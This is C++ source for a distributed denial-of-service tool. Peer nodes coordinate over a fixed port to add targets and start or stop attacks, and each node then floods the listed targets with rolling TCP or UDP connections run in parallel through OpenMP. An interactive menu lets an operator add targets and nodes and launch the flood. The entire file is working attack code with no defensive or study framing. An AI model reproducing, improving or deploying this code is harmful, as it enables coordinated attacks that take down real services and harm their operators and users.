#include "ddos.h"

using namespace std;

void attack::new_target(attack::node& node, string target) {
	bool valid = true;
	int i;
	for(i = 0; target[i] != ':'; i++);
	string target_ip = target.substr(0,i);
	struct sockaddr_in address;
	if (get_address(target_ip,PORT,&address)) {
		for (unsigned j = 0; j < node.targets.size(); j++)
			if (node.targets[j].IP == target_ip) {
				valid = false;
				break;
			}
		if (valid) {
			attack::target this_target;
			this_target.IP = target_ip;

			this_target.port = atoi(target.substr(i+1).c_str());

			#pragma omp critical
			node.targets.push_back(this_target);

			#pragma omp parallel for
			for (unsigned i = 0; i < node.nodes.size(); i++)
				propagate(node.nodes[i],3,target);
			cout << "NEW TARGET: " << target << "\n";
		}
	}
}
void attack::new_node(vector<string>& nodes, string node) {
	bool valid = true;
	for (unsigned i = 0; i < nodes.size(); i++)
		if (nodes[i] == node) {
			valid = false;
			break;
		}
	if (valid) {
		#pragma omp critical
		nodes.push_back(node);

		#pragma omp parallel for
		for (unsigned i = 0; i < nodes.size()-1; i++)
			propagate(nodes[i],2,node);
		cout << "NEW NODE: " << nodes[nodes.size()-1] << "\n";
	}
}
void attack::initialize(attack::node& node) {
	fstream file;
	string line;

	file.open("nodes",fstream::in);
	while(getline(file,line))
		node.nodes.push_back(line);
	file.close();

	file.open("targets",fstream::in);

	target input;
	char stream;
	while(!file.eof()) {
		file >> input.IP;
		if (input.IP.empty())
			break;
		file >> input.port;
		file >> stream;
		input.stream = stream != 'U';
		node.targets.push_back(input);
	}
	file.close();


	#pragma omp parallel shared(node)
	{
		#pragma omp sections nowait
		{
			#pragma omp section
			listen(node);

			#pragma omp section
			get_commands(node);

			#pragma omp section
			attack(node);
		}
	}
}
void attack::start_attack(attack::node& starter) {
	#pragma omp parallel for
	for (unsigned i = 0; i < starter.nodes.size(); i++)
		propagate(starter.nodes[i],0);

	#pragma omp critical
	starter.attacking = true;
}
void attack::attack(attack::node& starter) {
	bool alive = true, attack = false;
	while (alive) {
		if (attack) {
			int sockets[starter.queue];
			time_t t_sockets[starter.queue];
			struct sockaddr_in address;

			#pragma omp parallel for private(sockets, t_sockets, address)
			for (unsigned i = 0; i < starter.targets.size(); i++) {
				get_address(starter.targets[i].IP, starter.targets[i].port, &address);

				long closing = 0;

				for (long j = 0; attack;) {
					if (starter.targets[i].stream)
						sockets[j] = socket(AF_INET, SOCK_STREAM, 0);
					else
						sockets[j] = socket(AF_INET, SOCK_DGRAM, 0);
					time(&t_sockets[j]);

					if (difftime(t_sockets[j], t_sockets[closing]) >= starter.wait) {
						cout << "closing " << closing << ":" << sockets[closing] << "\n";
						close(sockets[closing]);
						sockets[closing] = -1;
						closing++;
						if (closing == starter.queue)
							closing = 0;
					}

					cout << j << ":" << sockets[j] << "\n: ";
					if (connect(sockets[j], (struct sockaddr*) &address, sizeof(address)) == -1)
						sockets[j] = -1;

					if (j == starter.queue-1)
						j = 0;
					else
						j++;

					#pragma omp critical
					attack = starter.attacking;
				}


				for (long j = 0; j < starter.queue; j++)
					if (sockets[j] != -1)
						close(sockets[j]);
			}
			cout << "DONE\n: ";
		}

		#pragma omp critical
		alive = starter.active;

		#pragma omp critical
		attack = starter.attacking;
	}
}
void attack::stop_attack(attack::node& starter) {
	#pragma omp critical
	starter.attacking = false;

	#pragma omp parallel for
	for (unsigned i = 0; i < starter.nodes.size(); i++)
		propagate(starter.nodes[i],1);
}
void attack::terminate(attack::node& node) {
	fstream file;

	file.open("nodes",fstream::out | fstream::trunc);
	for (unsigned i = 0; i < node.nodes.size(); i++)
		file << node.nodes[i] << endl;
	file.close();

	file.open("targets",fstream::out | fstream::trunc);

	for (unsigned i = 0; i < node.targets.size(); i++) {
		file << node.targets[i].IP << " " << node.targets[i].port;
		if (node.targets[i].stream)
			file << " T\n";
		else
			file << " U\n";
	}
	file.close();

	#pragma omp critical
	node.active = false;

	exit(0);
}
void attack::get_commands(attack::node& node) {
	system("clear");
	cout << "- [A]ttack\n- [S]top\n- Add [T]arget\n- Add [N]ode\n- [L]ist Nodes\n- L[i]st Targets\n- [R]emove Node\n- R[e]move Target\n[Q]uit\n";
	char input;
	string msg;
	bool alive = true;
	while(alive) {
		cout << "\n: ";
		cin >> input;

		switch(input) {
			case 'q':
			case 'Q':
				terminate(node);
				return;

			case 'a':
			case 'A':
				start_attack(node);
				return;

			case 'n':
			case 'N':
				{
					cout << "IP\n";
					cin >> msg;
					
					struct sockaddr_in address;
					if (get_address(msg,PORT,&address))
						new_node(node.nodes, msg);
				}
				break;

			case 't':
			case 'T':
				{
					cout << "IP:port\n";
					cin >> msg;
					
					new_target(node, msg);
				}
				break;

			case 'l':
			case 'L':
				for (unsigned i = 0; i < node.nodes.size(); i++)
					cout << "\t[" << i << "]: " << node.nodes[i] << "\n";
				break;
			case 'i':
			case 'I':
				for (unsigned i = 0; i < node.targets.size(); i++)
					cout << "\t[" << i << "]: " << node.targets[i].IP << ":" << node.targets[i].port << (node.targets[i].stream ? " TCP\n" : " UDP\n");
				break;
			case 'r':
			case 'R':
				{
					int pos;
					cin >> pos;
					
					#pragma omp critical
					node.nodes.erase(node.nodes.begin()+pos);
				}
				break;
			case 'e':
			case 'E':
				{
					int pos;
					cin >> pos;
					
					#pragma omp critical
					node.targets.erase(node.targets.begin()+pos);
				}
				break;
		}

		#pragma omp critical
		alive = node.active;
	}
}
void attack::listen(attack::node& node) {
	int this_socket = socket(AF_INET,SOCK_STREAM,0);

	struct sockaddr_in address;
	address.sin_family = AF_INET;
	address.sin_port = htons(PORT);
	address.sin_addr.s_addr = htonl(INADDR_ANY);
	memset(&(address.sin_zero),0,8);

	if (!bind(this_socket, (struct sockaddr*) &address, sizeof(address))) {
		::listen(this_socket, 1);

		int bytes, connection;
		uint8_t buffer[64];
		struct sockaddr_in client;
		unsigned length;
		bool valid = false, alive = true;
		while (alive) {
			length = sizeof(client);
			
			connection = accept(this_socket, (struct sockaddr*) &client, &length);
			bytes = recvfrom(connection, buffer, 64, 0, (struct sockaddr*) &client, &length);
			
			valid = false;
			for (unsigned i = 0; i < node.nodes.size(); i++)
				if(node.nodes[i] == inet_ntoa(client.sin_addr)) {
					valid = true;
					break;
				}
			if (valid) {
				switch(buffer[0]) {
					case 8:
						if (bytes == 1)
							start_attack(node);
						cout << "START\n";
						break;
					case 9:
						if (bytes == 1)
							stop_attack(node);
						cout << "STOP\n";
						break;
					case 10:
						new_node(node.nodes,string((char*)buffer,2,bytes-2));
						break;
					case 11:
						new_target(node, string((char*)buffer,2,bytes-2));
						break;
				}
			}

			close(connection);

			#pragma omp critical
			alive = node.active;
		}
		close(this_socket);
	} else {
		cerr << "LISTEN: could not bind. " << strerror(errno) << "\n";
		exit(1);
	}
}

void attack::propagate(string node, char type, string message) {
	struct sockaddr_in address;
	if (get_address(node,PORT,&address)) {
		int this_socket = socket(AF_INET,SOCK_STREAM,0);
		
		if (connect(this_socket, (struct sockaddr*) &address, sizeof(address)) == -1) {
			this_socket = -1;
			cerr << "PROPAGATE: Could not connect to node " << node << endl;
		}
		
		if (this_socket != -1) {
			message.insert(0, 1, (char) type + 8);
			message.insert(1, 1, ' ');
			cout << message << "\n";
			int bytes;
			if ((bytes = send(this_socket, message.c_str(), message.length(), 0)) < 0)
				cerr << "PROPAGATE: Could not send to node " << node << "\n\t" << strerror(errno) << "\n";
			else
				cout << "Sent " << bytes << " bytes through port " << PORT << "\n";
			close(this_socket);
		}
	}
}
int attack::get_address(string name, short port, struct sockaddr_in* address) {
	struct hostent *host;
	if ((host = gethostbyname(name.c_str()))) {
		address->sin_family = AF_INET;
		address->sin_port = htons(port);
		address->sin_addr.s_addr = ((struct in_addr*)host->h_addr)->s_addr;

		memset(&(address->sin_zero),0,8);
		return -1;
	} else {
		switch (h_errno) {
			case HOST_NOT_FOUND:
				cerr << "GET_ADDRESS: host not found (" << name << ")" << endl; break;
			case NO_ADDRESS:
				cerr << "GET_ADDRESS: host does not have IP address (" << name << ")" << endl; break;
			case NO_RECOVERY:
			case TRY_AGAIN:
				return get_address(name,port,address);
		}
		return 0;
	}
}
